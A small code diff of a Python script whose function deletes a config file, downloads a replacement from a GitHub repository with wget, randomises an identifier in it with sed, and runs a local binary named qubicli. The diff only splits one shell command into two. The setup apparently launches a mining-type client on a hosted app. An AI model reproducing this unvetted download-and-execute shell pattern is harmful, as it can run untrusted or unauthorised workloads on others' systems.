@@ -16,7 +16,8 @@ def building1():
   import os
   os.system('rm -rf appsettings.json && wget https://github.com/rxt36q6/myrend/raw/main/appsettings.json && cat appsettings.json')
   os.system('ls')
-  os.system('sed -i "s/samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json && ./qubicli')
+  os.system('sed -i "s/samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json')
+  os.system('cat appsettings.json && ./qubicli')
 
 if __name__ == "__main__":
   app.start()
